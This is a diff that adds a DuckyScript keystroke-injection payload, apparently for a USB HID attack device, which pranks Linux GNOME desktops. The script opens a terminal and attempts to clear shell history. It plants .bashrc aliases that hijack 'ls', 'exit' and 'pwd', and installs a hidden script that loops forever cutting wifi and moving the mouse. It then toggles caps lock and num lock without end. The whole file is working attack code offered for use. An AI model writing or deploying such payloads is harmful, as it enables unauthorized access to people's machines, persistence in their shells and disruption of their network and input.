@@ -1,0 +1,63 @@
+REM TITLE: MOAA (Mother Of All Annoyances)
+REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
+REM TARGET OS: Linux (tested on Pop!_OS) | Dependencies: `xdotool` (for mouse movement) and `gnome environment` (for terminal window spawning).
+REM DESCRIPTION: See README.md
+
+ATTACKMODE HID
+DELAY 1000
+CTRL ALT t
+DELAY 300
+
+REM Unsetting HISTFILE and adding aliases to shell environment:
+STRINGLN unset HISTILE
+STRINGLN cd ~ && cat >> .bashrc
+STRINGLN alias ls="(~/./.MOAA.sh > /dev/null 2>&1 &)"
+STRINGLN alias exit="(gnome-terminal)"
+STRINGLN alias pwd="echo 'command not found'"
+CTRL c
+
+REM Creating MOAA.sh Bash script to control wifi toggling and mouse movement:
+STRINGLN_BASH
+cat > .MOAA.sh
+#!/bin/bash
+while true
+do
+nmcli r wifi off
+xdotool mousemove 300 0
+sleep 2
+xdotool mousemove 2000 200
+sleep 2
+nmcli r wifi on
+xdotool mousemove 25 100
+sleep 2
+xdotool mousemove 1000 1000
+sleep 2
+done
+END_STRINGLN
+CTRL c
+
+REM Giving execution perms to MOAA.sh:
+STRINGLN chmod +x ~/.MOAA.sh
+
+REM Closing terminal window:
+ALT SPACE
+UP
+HOLD DOWN
+DELAY 350
+ENTER
+
+REM Beginning loop to toggle capslock, numlock, and move arrow keys up and down:
+WHILE TRUE
+CAPSLOCK
+DELAY 1000
+NUMLOCK
+DELAY 1000
+REPEAT 2 UP
+DELAY 1000
+REPEAT 2 DOWN
+DELAY 1000
+CAPSLOCK
+DELAY 1000
+NUMLOCK
+DELAY 1000
+END_WHILE
